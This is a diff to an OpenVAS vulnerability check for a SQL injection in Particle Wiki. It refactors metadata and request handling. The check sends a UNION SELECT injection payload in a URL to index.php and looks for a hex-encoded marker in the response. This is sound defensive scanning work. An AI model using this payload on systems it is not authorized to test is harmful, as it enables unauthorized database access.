@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_particle_wiki_18273.nasl 14233 2019-03-16 13:32:43Z mmartin $
 #
 # Particle Wiki Index.PHP SQL Injection Vulnerability
 #
@@ -27,8 +26,8 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100837");
-  script_version("$Revision: 14233 $");
-  script_tag(name:"last_modification", value:"$Date: 2019-03-16 14:32:43 +0100 (Sat, 16 Mar 2019) $");
+  script_version("2019-05-14T08:13:05+0000");
+  script_tag(name:"last_modification", value:"2019-05-14 08:13:05 +0000 (Tue, 14 May 2019)");
   script_tag(name:"creation_date", value:"2010-10-04 14:08:22 +0200 (Mon, 04 Oct 2010)");
   script_bugtraq_id(18273);
   script_tag(name:"cvss_base", value:"7.5");
@@ -47,40 +46,39 @@ if (description)
   script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
   script_dependencies("gb_particle_wiki_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_exclude_keys("Settings/disable_cgi_scanning");
-  script_tag(name:"solution", value:"The vendor released an update. Please see the references for more
-information.");
-  script_tag(name:"solution_type", value:"VendorFix");
-  script_tag(name:"summary", value:"Particle Wiki is prone to an SQL-injection vulnerability. This issue
-is due to a failure in the application to properly sanitize user-
-supplied input before using it in an SQL query.
+  script_mandatory_keys("particle_wiki/detected");
 
-A successful exploit could allow an attacker to compromise the
-application, access or modify data, or exploit vulnerabilities in the
-underlying database implementation.");
+  script_tag(name:"solution", value:"The vendor released an update. Please see the references for more
+  information.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+
+  script_tag(name:"summary", value:"Particle Wiki is prone to an SQL-injection vulnerability. This issue
+  is due to a failure in the application to properly sanitize user-
+  supplied input before using it in an SQL query.");
+
+  script_tag(name:"impact", value:"A successful exploit could allow an attacker to compromise the
+  application, access or modify data, or exploit vulnerabilities in the
+  underlying database implementation.");
+
   exit(0);
 }
 
 include("http_func.inc");
-
+include("http_keepalive.inc");
 include("version_func.inc");
 
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
 
-if(!dir = get_dir_from_kb(port:port,app:"particle_wiki"))exit(0);
-
-url = string(dir, "/index.php?version=-1%20union%20select%201,1,1,1,1,0x53514c2d496e6a656374696f6e2d54657374%20--");
-req = string("GET ",url," HTTP/1.1\r\nHost: ", get_host_name(),"\r\n\r\n");
-buf = http_send_recv(port:port,data:req);
-
-if("SQL-Injection-Test" >< buf) {
-
-  security_message(port:port);
+if(!dir = get_dir_from_kb(port:port, app:"particle_wiki"))
   exit(0);
 
+url = string(dir, "/index.php?version=-1%20union%20select%201,1,1,1,1,0x53514c2d496e6a656374696f6e2d54657374%20--");
+
+if(http_vuln_check(port:port, url:url, pattern:"SQL-Injection-Test")) {
+  report = report_vuln_url(port:port, url:url);
+  security_message(port:port, data:report);
+  exit(0);
 }
 
 exit(0);
-
